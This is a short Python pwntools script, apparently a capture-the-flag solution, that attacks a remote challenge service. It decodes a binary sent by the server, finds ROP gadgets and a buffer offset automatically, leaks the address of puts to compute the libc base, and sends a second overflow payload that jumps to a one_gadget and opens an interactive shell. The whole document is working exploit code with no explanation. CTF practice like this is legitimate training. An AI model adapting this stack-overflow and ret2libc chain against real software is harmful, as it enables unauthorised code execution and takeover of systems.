import os
from pwn import *
from base64 import b64decode

# context.log_level = "debug"

p = remote('challs.xmas.htsp.ro', 12002)
libc = ELF('/home/inertfluid/libc-database/db/libc6_2.27-3ubuntu1_amd64.so')
bin_sh_offset = 0x1b3e9a
p.recvuntil(": b'")
data = p.recvuntil("'")[:-1]

f = open('./encoded', 'w')
f.write(data)
f.flush()
f.close()
os.system('base64 -d encoded > out')

pop_rdi = int(os.popen('ROPgadget --binary ./out | grep "pop rdi"').read()[:18], 16)
offset = int(os.popen('objdump -d -M intel out | grep "lea    rax"').read()[-7:-2], 16)
main = int('0x'+ os.popen('objdump -d -M intel out | grep "push   rbp"').read().split('\n')[-3].split(':')[0][2:], 16)

if offset<0:
	offset =-offset


print hex(pop_rdi)
print hex(offset)
print hex(main)

binary = ELF('./out')
puts_call = binary.symbols['puts']
puts_got = binary.symbols['got.puts']

exploit  = ''
exploit += 'A'*offset 
exploit += 'BBBBCCCC'
exploit += p64(pop_rdi)
exploit += p64(puts_got)
exploit += p64(puts_call)
exploit += p64(main)
p.sendline(exploit)

p.recvuntil('\n')
p.recvuntil('\n')
p.recvuntil('\n')
p.recvuntil('\n')
p.recvuntil('\n')
p.recvuntil('\n')
libc_leak = u64(p.recvuntil('\n')[:-1] + '\x00\x00')
print hex(libc_leak)

libc_base = libc_leak - libc.symbols['puts']
one_gadget = libc_base + 0x10a38c
print hex(libc_base)

exploit  = ''
exploit += 'A'*offset 
exploit += 'BBBBCCCC'
exploit += p64(one_gadget)

p.sendline(exploit)

p.interactive()